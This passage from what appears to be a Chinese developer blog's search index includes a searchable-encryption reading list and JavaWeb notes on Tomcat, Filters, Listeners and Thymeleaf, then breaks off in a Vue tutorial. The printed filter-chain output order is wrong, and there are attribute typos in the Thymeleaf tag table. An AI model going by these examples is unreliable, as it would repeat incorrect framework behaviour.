A】\n\n本文利用**局部敏感哈希**技术，提出了**一种新型的多关键词模糊搜索方案**。我们提出的方案通过算法设计而不是扩展索引文件来实现模糊匹配。它还消除了对预定义字典的需求，并有效地支持多个关键字模糊搜索，而不会增加索引或搜索复杂性。对真实数据的广泛分析和实验表明，我们提出的方案是安全、高效和准确的。据我们所知，这是第一个在加密的云数据上实现多关键字模糊搜索的工作。\n\n\n\n[使用外部存储器|回答大型数据集上的近似字符串查询](https://ieeexplore.ieee.org/document/5767856)【CCF A】\n\n本文开发了**一种基于成本的自适应算法**，该算法可以平衡检索候选匹配项和访问倒排列表的 I/O 成本。对大型真实数据集的实验证实，简单地将现有算法适应基于磁盘的设置并不能很好地工作，并且我们的新技术可以有效地回答查询。此外，我们的解决方案明显优于最近的基于树的指数 B<sup>ed</sup>-tree。\n\n[对云中的加密数据使用 N-Gram 和加密方法进行模糊关键字匹配|SpringerLink](https://link.springer.com/chapter/10.1007/978-981-15-0947-6_52)\n\n\n\n布谷鸟搜索改进：https://link.springer.com/article/10.1007/s00500-016-2062-9【CCF C】\n\n[基于文档向量的多关键词密文检索 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/412240360)\n\n### No.13 PPPSED方案\n\n**论文名称：《Privacy-Preserving Phrase Search over Encrypted Data》**\n\n- 作者： 侯佳伟, 刘雅茹, 荣浩\n- 单位：青岛大学\n- 会议：[ICBDT '21: 2021 4th International Conference on Big Data Technologies](https://dl.acm.org/doi/10.1145/3490322.3490347)\n\n- 时间：2021年12月\n\n在本文中，我们提出了**一个支持动态更新的短语搜索SSE方案**。我们的方案只需要用户和云服务器之间的单轮交互，位置信息无法泄露。我们的方案利用**虚拟二叉树**（VBTree），它只是一个用于存储关键字的逻辑结构。在实际存储中，每个叶节点的元素都存储在哈希表中，非叶节点映射到**布隆过滤器**。为了确定搜索关键字的位置关系，我们的方案利用**同态加密**和**双线性映射**。这样，位置信息就无法泄露。\n\n### No.14 CBFED方案\n\n**论文名称：《A Searchable Ciphertext Retrieval Method Based  on Counting Bloom Filter over Cloud Encrypted  Data》**\n\n- 作者： kuang YueJuan, Li Yong, Li Ping\n- 单位：\n- 会议：[IJCS_47_2_15.pdf (iaeng.org)](http://www.iaeng.org/IJCS/issues_v47/issue_2/IJCS_47_2_15.pdf)\n\n- 时间：2021年12月\n\n本文首先构建了文献索引基于**计数布隆过滤器**检索，并映射关键字哈希在文件集合的计数布隆过滤器索引向量，所以实现了基于关键字的密文检索。同时，支持检索的**动态更新**文件索引。其次，对检索结果进行排序根据关联度不能达到的原因计数布隆过滤器本身没有语义函数。使用了**频率矩阵**，采用 **TF-IDF 模型**计算关键词的关联得分以便根据相关性得分对搜索结果进行排序。\n\n\n\n[Achieve Efficient and Verifiable Conjunctive and Fuzzy Queries over Encrypted Data in Cloud | IEEE Journals & Magazine | IEEE Xplore](https://ieeexplore.ieee.org/document/8744411)\n\n## 📋Reference\n\n- [可搜索加密SWP方案实现 - 简书](https://www.jianshu.com/p/d620bcf235e5?utm_campaign=haruki&utm_content=note&utm_medium=reader_share&utm_source=qq)\n- [可搜索加密基础知识的归纳与总结](https://blog.csdn.net/A33280000f/article/details/116270371?spm=1001.2014.3001.5502)\n- [精选12篇区块链与可搜索加密相结合论文进行汇总与概括](https://blog.csdn.net/A33280000f/article/details/119273021?spm=1001.2014.3001.5501)\n- [专利：一种密文检索方法](https://patents.google.com/patent/CN103927340B/zh)\n- [专利：一种云存储密文检索方法及其系统](https://patents.google.com/patent/CN103944711A/zh)  \n- [冯登国：密文检索——打开云存储加密桎梏的金钥匙](https://www.docin.com/p-824752557.html)\n- [论文 | 可搜索加密 · 开山之作 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/135382555)\n- [加密技术的未来：从服务端密码存储到用户数据加密方案](https://markdowner.net/article/158265681589440512)\n- [可搜索加密_笔记](http://www.atomsec.org/paper/practical-techniques-for-searches-on-encrypted-data/)\n- [可搜索加密1_笔记](https://blog.csdn.net/yalundong/article/details/72792973)\n- [可搜索加密之倒排索引](https://blog.csdn.net/weixin_39032619/article/details/110000216?spm=1001.2014.3001.5502)\n- [最牛一篇布隆过滤器详解](https://mp.weixin.qq.com/s/1AbsMXNvTcZ_baKES8K4Kg)\n- [简单的复现 多关键字模糊可搜索加密](https://blog.csdn.net/weixin_39032619/article/details/110436737)\n- [Python学习-numpy高级数组和矩阵的内积函数inner和matmul](https://blog.csdn.net/qq_19979101/article/details/92728610)\n- [TF-IDF（词频-逆文档频率）介绍 - 简书 ](https://www.jianshu.com/p/b2c4ee414fac)\n- [Searchable Symmetric Encryption (SSE)介绍](https://blog.csdn.net/c630843901/article/details/121541916?spm=1001.2014.3001.5502)\n- [一种基于BloomFilter的改进型加密文本模糊搜索机制研究](http://staff.ustc.edu.cn/~zhangwm/Paper/2019_15.pdf)\n- [密码学中的MAC](https://blog.csdn.net/mutourend/article/details/100576422)\n- [Homomorphic MAC (unb.ca)](http://www.cs.unb.ca/~rlu1/slide/20140523chenli.pdf)\n- [bloom filter浅析（基本概念，概率分析，源码分析）](https://blog.csdn.net/bnbjin/article/details/110437288)\n- [NLP–文本向量化](https://deeplearning-doc.readthedocs.io/en/latest/deeplearning/NLP/NLP-text-vector.html)\n- [Secure nearest neighbor revisited](http://ieeexplore-ieee-org-s.vpn.uestc.edu.cn:8118/document/6544870)\n- [分类算法之K最近邻算法(KNN)的python实现](https://www.jianshu.com/p/84f94f956382)\n- [密码学的安全性浅析-3 - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/175281.html#:~:text=MAC是指消息认证码（带密钥的Hash函数），是密码学中通信实体双方使用的一种验证机制，保证消息数据完整性的一种工具。,构造方法由M.Bellare提出，安全性依赖于Hash函数，故也称带密钥的Hash函数。 消息认证码是基于密钥和消息摘要所获得的一个值，可用于数据源发送方认证和完整性校验。)\n- [密码学的安全性浅析-2 (qq.com)](https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652886199&idx=1&sn=eccfe7c2e1b33a75e822fdda9a03dc45&chksm=bd59a87a8a2e216cc2fa92caa2d6259c668979e451c2e2db85a2f53b4a896ebf9ad06ac8d492&scene=21#wechat_redirect)\n- [编辑距离详解 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/91667128)\n- [文本离散表示（三）：TF-IDF结合n-gram进行关键词提取和文本相似度分析 - Luv_GEM - 博客园 (cnblogs.com)](https://www.cnblogs.com/Luv-GEM/p/10555843.html)\n\n\n\n\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果你觉得本文对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["可搜索加密"],"categories":["Crypto"]},{"title":"JavaWeb-汇总","url":"/posts/4688.html","content":"\n## 前言\n\n本篇是我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《Java-Web》的汇总，由于这部分知识我之前学过一部分所以只会更新需要复习的知识和没学过的知识，这个章节会作为长期更新的一个章节，部分知识点用到了再学，学了再更。\n\n## 笔记汇总\n\n- 前端三剑客：[Web前端三剑客 | 简简 (jwt1399.top)](https://jwt1399.top/posts/38162.html)\n\n- Maven：[Maven | 简简(jwt1399.top)](https://jwt1399.top/posts/38008.html)\n- Tomcat：[Tomcat-汇总 | 简简](https://jwt1399.top/posts/4688.html#toc-heading-3)\n- Servlet：[Servlet | 简简 (jwt1399.top)](https://jwt1399.top/posts/55715.html)\n- Cookie & Session：[Cookie & Session | 简简](https://jwt1399.top/posts/37985.html)\n- Filter & Listener：[Filter & Listener-汇总 | 简简](https://jwt1399.top/posts/4688.html#toc-heading-6)\n- JSP：[JSP学习笔记 | 简简 (jwt1399.top)](https://jwt1399.top/posts/59789.html)\n- Thymeleaf：[Thymeleaf | 简简](https://jwt1399.top/posts/4688.html#toc-heading-12)\n\n- Ajax & Axios [Ajax & Axios & Json | 简简](https://jwt1399/posts/16553.html)\n\n- Vue & Element：[Vue & Element | 简简 (jwt1399.top)](https://jwt1399.top/posts/28587.html)\n\n## Tomcat\n\n###  Tomcat安装\n\n[Tomcat安装 |  简简 (jwt1399.top)](https://jwt1399.top/posts/55715.html#toc-heading-2)\n\n### Tomcat类加载\n\nTomcat 服务器如果要同时运行多个 Web 应用程序，那么就必须要实现不同应用程序之间的隔离。\n\n- Tomcat 需要分别去加载不同应用程序的类以及依赖，还必须保证应用程序之间的类无法相互访问，而传统的类加载机制无法做到这一点\n- 而且每个应用程序都有自己的依赖，如果两个应用程序使用了同一个版本的同一个依赖，那么还有必要去重新加载吗？\n\n为了解决上述问题，Tomcat 服务器编写了一套自己的类加载机制。\n\n![](https://img.jwt1399.top/img/202205202322938.png)\n\n首先我们要知道，Tomcat 本身也是一个 Java 程序，它要做的是去动态加载我们编写的 Web 应用程序中的类，而要解决以上提到的一些问题，就出现了几个新的类加载器，我们来看看各个加载器的不同之处：\n\n| 加载器               | 描述                                                         |\n| -------------------- | ------------------------------------------------------------ |\n| Common ClassLoader   | Tomcat最基本的类加载器。加载路径中的class可以被Tomcat容器本身以及各个Web应用程序访问。 |\n| Catalina ClassLoader | Tomcat容器私有的类加载器。加载路径中的class对于Web应用程序不可见。 |\n| Shared ClassLoader   | 各个Web应用程序共享的类加载器。加载路径中的class对于所有Web应用程序可见，但是对于Tomcat容器不可见。 |\n| Webapp ClassLoader   | 各个Web应用程序私有的类加载器。加载路径中的class只对当前Web应用程序可见，每个Web应用程序都有一个自己的类加载器，此加载器可能存在多个实例。 |\n| JasperLoader         | JSP类加载器。每个JSP文件都有一个自己的类加载器，也就是说，此加载器可能会存在多个实例。 |\n\n通过这样进行划分，就很好地解决了我们上面所提到的问题，但是我们发现，这样的类加载机制，破坏了JDK 的`双亲委派机制`，比如 Webapp ClassLoader，它只加载自己的 class 文件，它没有将类交给父类加载器进行加载，也就是说，我们可以随意创建和 JDK 同包同名的类，岂不是就出问题了？难道Tomcat的开发团队没有考虑到这个问题吗？\n\n![](https://img.jwt1399.top/img/202205202322444.jpg)\n\n实际上，WebApp ClassLoader 的加载机制是这样的：WebApp ClassLoader 加载类的时候，绕开了 App ClassLoader，直接先使用 Ext ClassLoader 来加载类。这样的话，如果定义了同包同名的类，就不会被加载，而如果是自己定义的类，由于该类并不是 JDK 内部或是扩展类，所有不会被加载，而是再次回到 WebApp ClassLoader 进行加载，如果还失败，再使用 AppClassloader 进行加载。\n\n## Filter\n\n### Filter简介\n\n有了 Session 之后，就可以很好地控制用户的登陆验证了，只有授权的用户，才可以访问一些页面，但是我们需要一个一个去进行配置，还是太过复杂，能否一次性地过滤掉没有登录验证的用户呢？\n\nFilter过滤器相当于在所有访问前加了一堵墙，来自浏览器的所有访问请求都会首先经过Filter过滤器，只有过滤器允许通过的请求，才可以顺利地到达对应的Servlet，而过滤器不允许的通过的请求，我们可以自由地进行控制是否进行重定向或是请求转发。并且过滤器可以添加很多个。\n\n![](https://img.jwt1399.top/img/image-20220427133711464.png)\n\n### 创建过滤器\n\n定义类，实现 Filter 接口，并重写其方法，并添加`@WebFilter`注解\n\n```java\n@WebFilter(\"/*\")   //配置Filter拦截资源的路径，/* 表示拦截所有的资源\npublic class TestFilter1 implements Filter {\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        \n    }\n}\n```\n\n现在我们发起的所有请求，一律需要经过此过滤器，并且所有的请求都没有任何的响应内容。\n\n那么如何让请求可以顺利地到达对应的 Servlet，只需要添加一句放行语句\n\n```java\nfilterChain.doFilter(servletRequest, servletResponse);//放行，，也就是让其访问本该访问的资源。\n```\n\n由于我们整个应用程序可能存在多个过滤器，那么这行代码的意思实际上是将此请求继续传递给下一个过滤器，当没有下一个过滤器时，才会到达对应的Servlet进行处理，我们可以再来创建一个过滤器看看效果\n\n```java\n@WebFilter(\"/*\")\npublic class TestFilter2 implements Filter {\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        System.out.println(\"我是2号过滤器\");\n        filterChain.doFilter(servletRequest, servletResponse);\n    }\n}\n```\n\n### 过滤器链\n\n过滤器链是指在一个Web应用，可以配置多个过滤器，过滤器的过滤顺序是按照类名的自然排序进行的，在经过第一个过滤器之后，会继续前往第二个过滤器，只有两个过滤器全部经过之后，才会到达我们的Servlet中。\n\n![](https://img.jwt1399.top/img/image-20220427133421324.png)\n\n实际上，当`doFilter`方法调用时，就会一直向下直到Servlet，在Servlet处理完成之后，又依次返回到最前面的Filter，类似于递归的结构，我们添加几个输出语句来判断一下：\n\n```java\n@WebFilter(\"/*\") \npublic class TestFilter1 implements Filter {\n  @Override\n  public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException     {\n    System.out.println(\"我是1号过滤器放行前逻辑代码\");\n    filterChain.doFilter(servletRequest, servletResponse);\n    System.out.println(\"我是1号过滤器放行后逻辑代码\");\n  }\n}\n```\n\n```java\n@WebFilter(\"/*\") \npublic class TestFilter2 implements Filter {\n@Override\n  public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n    System.out.println(\"我是2号过滤器放行前逻辑代码\");\n    filterChain.doFilter(servletRequest, servletResponse);\n    System.out.println(\"我是2号过滤器放行后逻辑代码\");\n  }\n}\n```\n\n```java\n//输出\n我是1号过滤器放行前逻辑代码\n我是2号过滤器放行前逻辑代码\n我是1号过滤器放行后逻辑代码\n我是2号过滤器放行后逻辑代码\n```\n\n### HttpFilter\n\n同 Servlet 一样，Filter 也有对应的 HttpFilter 专用类，它针对 HTTP 请求进行了专门处理，因此我们可以直接继承 HttpFilter 来编写\n\n```java\n@WebFilter(\"/*\")\npublic class MainFilter extends HttpFilter {\n    @Override\n    protected void doFilter(HttpServletRequest req, HttpServletResponse res, FilterChain chain) throws IOException, ServletException {\n        //...\n    }\n}\n```\n\n## Listener\n\n如果我们希望，在应用程序加载的时候，或是 Session 创建的时候，亦或是在 Request 对象创建的时候进行一些操作，那么这个时候，我们就可以使用监听器来实现。\n\n![](https://img.jwt1399.top/img/202205202323156.png)\n\n默认为我们提供了很多类型的监听器，我们这里就演示一下监听Session的创建即可：\n\n```java\n@WebListener\npublic class TestListener implements HttpSessionListener {\n    @Override\n    public void sessionCreated(HttpSessionEvent se) {\n        System.out.println(\"有一个Session被创建了\");\n    }\n}\n```\n\n有关监听器相关内容，了解即可。\n\n\n\n## Thymeleaf\n\n### 简介\n\n**Thymeleaf** 是一个适用于 Web 和独立环境的现代化服务器端 **Java 模板引擎**\n\n**模板引擎**是为了使用户界面与业务数据分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的 html 文档。\n\n### 快速入门\n\n1、首先还是新建一个 Web 项目，在创建时勾选 Thymeleaf 依赖\n\n2、编写一个前端页面，名称为`test.html`，放在 resource 目录下，在 html 标签内部添加`xmlns:th=\"http://www.thymeleaf.org\"`引入 Thymeleaf 定义的标签属性\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n    <div th:text=\"${title}\"></div>\n</body>\n</html>\n```\n\n3、编写模板引擎，设置默认页面\n\n```java\n@WebServlet(\"/index\")\npublic class HelloServlet extends HttpServlet {\n    TemplateEngine engine;\n    @Override\n    public void init() throws ServletException {\n        engine = new TemplateEngine();\n        ClassLoaderTemplateResolver r = new ClassLoaderTemplateResolver();\n        engine.setTemplateResolver(r);\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        Context context = new Context();\n        context.setVariable(\"title\", \"我是标题\");\n        engine.process(\"test.html\", context, resp.getWriter());\n    }\n}\n```\n\n我们发现，浏览器得到的页面，就是已经经过模板引擎解析好的页面，而我们的代码依然是后端处理数据，前端展示数据，因此使用 Thymeleaf 就能够使得当前Web应用程序的前后端划分更加清晰。\n\n### 语法基础\n\n#### TemplateEngine\n\n首先我们看看后端部分，我们需要通过`TemplateEngine`对象来将模板文件渲染为最终的HTML页面：\n\n```java\nTemplateEngine engine;\n@Override\npublic void init() throws ServletException {\n    engine = new TemplateEngine();\n  \t//设定模板解析器决定了从哪里获取模板文件，这里直接使用ClassLoaderTemplateResolver表示加载内部资源文件\n    ClassLoaderTemplateResolver r = new ClassLoaderTemplateResolver();\n    engine.setTemplateResolver(r);\n}\n```\n\n此对象只需要创建一次，之后就可以一直使用了。接着我们来看如何使用模板引擎进行解析：\n\n```java\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    //创建上下文，上下文中包含了所有需要替换到模板中的内容\n    Context context = new Context();\n    context.setVariable(\"title\", \"<h1>我是标题</h1>\");\n    //通过此方法就可以直接解析模板并返回响应\n    engine.process(\"test.html\", context, resp.getWriter());\n}\n```\n\n接下来就可以在前端页面中通过上下文提供的内容，来将Java代码中的数据解析到前端页面。\n\n#### 常用标签\n\n| 标签      | 作用               | 示例                                                         |\n| :-------- | :----------------- | :----------------------------------------------------------- |\n| th:id     | 替换id             | `<input th:id=\"${user.id}\"/>`                                |\n| th:text   | 文本替换           | `<p text:=\"${user.name}\">测试</p>`                           |\n| th:utext  | 支持html的文本替换 | `<p utext:=\"${htmlcontent}\">content</p>`                     |\n| th:object | 替换对象           | `<div th:object=\"${user}\"></div>`                            |\n| th:value  | 替换值             | `<input th:value=\"${user.name}\" >`                           |\n| th:each   | 迭代               | `<tr th:each=\"student:${user}\" >`                            |\n| th:href   | 替换超链接         | `<a th:href=\"@{index.html}\">超链接</a>`                      |\n| th:src    | 替换资源           | `<script type=\"text/javascript\" th:src=\"@{index.js}\"></script>` |\n\n比如示例中编写的：\n\n```html\n<div th:text=\"${title}\"></div>\n```\n\n使用了`th:text`来为当前标签指定内部文本，注意任何内容都会变成普通文本，即使传入了一个HTML代码\n\n如果我希望向内部添加一个HTML文本呢？我们可以使用`th:utext`属性：\n\n```html\n<div th:utext=\"${title}\"></div>\n```\n\n传入的title属性，不仅仅只是一个字符串的值，而且是一个字符串的引用，我们可以直接通过此引用调用相关的方法：\n\n```html\n<div th:text=\"${title.toLowerCase()}\"></div>\n```\n\n这样看来，Thymeleaf既能保持JSP为我们带来的便捷，也能兼顾前后端代码的界限划分。\n\n除了替换文本，它还支持替换一个元素的任意属性，我们发现，`th:`能够拼接几乎所有的属性，一旦使用`th:属性名称`，那么属性的值就可以通过后端提供了，比如我们现在想替换一个图片的链接：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n    <img width=\"700\" th:src=\"${url}\" th:alt=\"${alt}\">\n</body>\n</html>\n```\n\n```java\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    Context context = new Context();\n    context.setVariable(\"url\", \"https://jwt1399.top/favicon.jpg\");\n  \tcontext.setVariable(\"alt\", \"图片加载不出来\");\n    engine.process(\"test.html\", context, resp.getWriter());\n}\n```\n\nThymeleaf还可以进行一些算术运算，几乎Java中的运算它都可以支持：\n\n```html\n<div th:text=\"${value % 2}\"></div>\n```\n\n同样的，它还支持三元运算：\n\n```html\n<div th:text=\"${value % 2 == 0 ? 'yyds' : 'lbwnb'}\"></div>\n```\n\n多个属性也可以通过`+`进行拼接，就像Java中的字符串拼接一样，这里要注意一下，字符串不能直接写，要添加单引号：\n\n```html\n<div th:text=\"${name}+' 我是文本 '+${value}\"></div>\n```\n\n#### 表达式\n\n##### 链接表达式: @{…}\n\n如果想引入链接比如link，href，src，使用`@{资源地址}`引入资源\n\n```html\n<link rel=\"stylesheet\" th:href=\"@{index.css}\">\n\n<script type=\"text/javascript\" th:src=\"@{index.js}\"></script>\n\n<a th:href=\"@{index.html}\">超链接</a>\n```\n\n##### 变量表达式: ${...}\n\n通过`${…}`进行取值\n\n```html\n<h2>取普通字符串</h2>\n<table border=\"0\">\n    <tr>\n        <td th:text=\"'我的名字是：'+${name}\"></td>\n    </tr>\n</table>\n\n\n<h2>取JavaBean对象</h2>\n<table bgcolor=\"#ffe4c4\" border=\"1\">\n    <tr>\n        <td>介绍</td>\n        <td th:text=\"${user.name}\"></td>\n    </tr>\n    <tr>\n        <td>年龄</td>\n        <td th:text=\"${user['age']}\"></td>\n    </tr>\n</table>\n\n<h2>取List取值</h2>\n<table bgcolor=\"#ffe4c4\" border=\"1\">\n    <tr th:each=\"item:${userlist}\">\n        <td th:text=\"${item}\"></td>\n    </tr>\n</table>\n\n<h2>取Map取值</h2>\n<table bgcolor=\"#8fbc8f\" border=\"1\">\n    <tr>\n        <td>place:</td>\n        <td th:text=\"${map.get('place')}\"></td>\n    </tr>\n    <tr>\n        <td>feeling:</td>\n        <td th:text=\"${map['feeling']}\"></td>\n    </tr>\n</table>\n```\n\n##### 选择变量表达式: *{...}\n\n变量表达式不仅可以写成${...}，而且还可以写成*{...}。\n\n但是，有一个重要的区别：星号语法针对选定对象而不是整个上下文评估表达式。也就是说，只要没有选定的对象，美元(`${…}`)和星号(`*{...}`)的语法就完全一样。\n\n什么是选定对象？使用`th:object`属性的表达式的结果。就可以选定对象，具体实例如下：\n\n```html\n<div th:object=\"${user}\">\n    <p>Name: <span th:text=\"*{name}\">小明</span></p>\n    <p>Age: <span th:text=\"*{age}\">18</span></p>\n    <p>Detail: <span th:text=\"*{detail}\">好好学习</span>.</p>\n</div>\n```\n\n当然`*{…}`也可和`${…}`混用。上面的代码如果不使用选定对象，完全等价于：\n\n```html\n<div>\n    <p>Name: <span th:text=\"*{user.name}\">小明</span>.</p>\n    <p>Age: <span th:text=\"${user.age}\">18</span>.</p>\n    <p>Detail: <span th:text=\"${user.detail}\">好好学习</span>.</p>\n</div>\n```\n\n##### 消息表达: #{...}\n\n`#{…}`是用来**读取配置文件中数据**的。\n\n```html\n<h2>消息表达</h2>\n<table bgcolor=\"#ffe4c4\" border=\"1\">\n    <tr>\n    <td>name</td>\n    <td th:text=\"#{jwt.name}\"></td>\n    </tr>\n    <tr>\n    <td>年龄</td>\n    <td th:text=\"#{jwt.age}\"></td>\n    </tr>\n    <tr>\n    <td>province</td>\n    <td th:text=\"#{province}\"></td>\n    </tr>\n</table>\n```\n\ntest.properties\n\n```properties\njwt.nane=jianjian\njwt.age=20\n```\n\n### 流程控制语法\n\n除了一些基本的操作，我们还可以使用Thymeleaf来处理流程控制语句，当然，不是直接编写Java代码的形式，而是添加一个属性即可。\n\n#### th:if\n\n如果 if 条件满足，则此标签留下；若 if 条件不满足，则此标签自动被移除\n\n```java\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    Context context = new Context();\n    context.setVariable(\"eval\", true);\n    engine.process(\"test.html\", context, resp.getWriter());\n}\n```\n\n```html\n<div th:if=\"${eval}\">我是判断条件标签</div>\n```\n\n`th:if`会根据其中传入的值或是条件表达式的结果进行判断，只有满足的情况下，才会显示此标签，具体的判断规则如下：\n\n- 如果值不是空的\n  - 值是布尔值并且为`true`\n  - 值是一个数字，并且是非零\n  - 值是一个字符，并且是非零\n  - 值是一个字符串，而不是“错误”、“关闭”或“否”\n  - 值不是布尔值、数字、字符或字符串\n- 如果值为空，th:if 将计算为 false\n\n#### th:unless\n\n`th:unless`与 `th:if `效果完全相反\n\n#### th:switch\n\n多分支条件判断，可以使用`th:switch`属性来实现\n\n```html\n<div th:switch=\"${eval}\">\n    <div th:case=\"1\">我是1</div>\n    <div th:case=\"2\">我是2</div>\n    <div th:case=\"3\">我是3</div>\n</div>\n```\n\n#### th:case\n\n多分支条件判断没有default属性，可以使用`th:case=\"*\"`来代替：\n\n```html\n<div th:case=\"*\">我是Default</div>\n```\n\n#### th:each\n\n实现遍历，假如我们有一个存放书籍信息的List需要显示，那么如何快速生成一个列表呢？我们可以使用`th:each`来进行遍历操作：\n\n```java\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    Context context = new Context();\n    context.setVariable(\"list\", Arrays.asList(\"伞兵一号的故事\", \"倒一杯卡布奇诺\", \"玩游戏要啸着玩\", \"十七张牌前的电脑屏幕\"));\n    engine.process(\"test.html\", context, resp.getWriter());\n}\n```\n\n```html\n<ul>\n    <li th:each=\"title : ${list}\" th:text=\"'《'+${title}+'》'\"></li>\n</ul>\n```\n\n`th:each`语法： \"**单个元素名称 : ${列表}**\"，最后生成的结果为：\n\n```html\n<ul>\n  <li>《伞兵一号的故事》</li>\n  <li>《倒一杯卡布奇诺》</li>\n  <li>《玩游戏要啸着玩》</li>\n  <li>《十七张牌前的电脑屏幕》</li>\n</ul>\n```\n\n我们还可以获取当前循环的迭代状态，只需要在 `th:each` 中添加 `iterStat` 即可，从中可以获取很多信息，比如当前的顺序 `${iterStat.index}` ：\n\n```html\n<ul>\n    <li th:each=\"title, iterStat : ${list}\" th:text=\"${iterStat.index}+'.《'+${title}+'》'\"></li>\n</ul>\n```\n\niterStat 属性有：\n\n- index：当前迭代索引，以0开头。\n- count：当前迭代索引，以1开头。\n- size：迭代变量中的元素总量。\n- current：每个迭代的迭代变量。\n- even/odd：当前迭代是偶数还是奇数。\n- first：当前迭代是否是第一个迭代。\n- last：当前迭代是否是最后一个迭代。\n\n### 模板布局\n\n在某些网页中，我们会发现，整个网站的页面，除了中间部分的内容会随着我们的页面跳转而变化外，有些部分是一直保持一个状态的。\n\nThymeleaf 可以轻松实现这样的操作，我们只需要将不会改变的板块设定为模板布局，并在不同的页面中插入这些模板布局，就无需每个页面都去编写同样的内容了。\n\n#### 模版页复用\n\n1、编写一个模版页`head.html`，里面放每个页面公有的代码，例如每个页面主标题一样\n\n```html\n<div class=\"head\" th:fragment=\"head-title\">\n    <div>\n        <h1>简简</h1>\n    </div>\n    <hr>\n</div>\n```\n\n2、编写另一个页面使用模版页\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>主页</title>\n</head>\n<body>\n    <div th:include=\"head.html::head-title\"></div> <!--引入head页面-->\n    <div>\n        <h1>慢慢来，比较快</h1>\n    </div>\n</body>\n</html>\n```\n\n我们可以使用`th:insert`和`th:replace`和`th:include`这三种方法来进行页面内容替换，那么`th:insert`、`th:replace`、`th:include`（3.0以来不推荐）有什么区别？\n\n- `th:insert`最简单：它只会插入指定的片段作为标签的主体。\n- `th:replace`实际上将标签直接替换为指定的片段。\n- `th:include`和`th:insert`相似，但它没有插入片段，而是只插入此片段的内容。\n\n#### 模版页参数传递\n\n例如我们现在希望插入二级标题，二级标题的内容不是定死的，不同页面不一样\n\n1、在二级标题处设置一个占位参数\n\n```html\n<div class=\"head\" th:fragment=\"head-title(sub)\">\n    <div>\n        <h1>简简</h1>\n        <h2 th:text=\"${sub}\"></h2>\n    </div>\n    <hr>\n</div>\n```\n\n2、使用模版页是顺带传入参数\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>主页</title>\n</head>\n<body>\n    <div th:include=\"head.html::head-title('Web安全页')\"></div> <!--传参-->\n    <div>\n        <h1>慢慢来，比较快</h1>\n    </div>\n</body>\n</html>\n```\n\n\n\n- \n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Web"],"categories":["JavaWeb"]},{"title":"Vue & Element","url":"/posts/28587.html","content":"\n## Vue2\n\n### 简介\n\nVue官网：[Vue2](https://cn.vuejs.org/index.html)、[Vue3](https://v3.cn.vuejs.org/)\n\n官方教程：[Vue.js 教程 (dcloud.io)](https://learning.dcloud.io/#/)\n\nVue 是一套前端框架，免除原生 JavaScript 中的 DOM 操作，简化书写。Vue 基于 MVVM(Model-View-View-Model) 思想，实现数据的双向绑定，将编程的关注点放在数据上。\n\n![](https://img.jwt1399.top/img/1.png)\n\n图中的 `Model` 就是数据，`View` 是视图，用户可以通过浏览器看到的内容；`Model` 和 `View` 是通过 `ViewModel` 对象进行双向绑定的，而 `ViewModel` 对象是 `Vue` 提供的。\n\n### 快速入门\n\n1、引入 vue.js\n\n```javascript\n<script src=\"js/vue.js\"></script>\n//or\n<script src=\"https://cdn.jsdelivr.net/npm/vue/dist/vue.js\"></script>\n```\n\n2、创建 Vue 核心对象，进行数据绑定\n\n```javascript\n<script>\n    new Vue({\n        el: \"#app\",\n        data() {\n            return {\n                username: \"\"\n            }\n        },\n        methods:{\n            show(){\n                alert(\"我被点了...\");\n            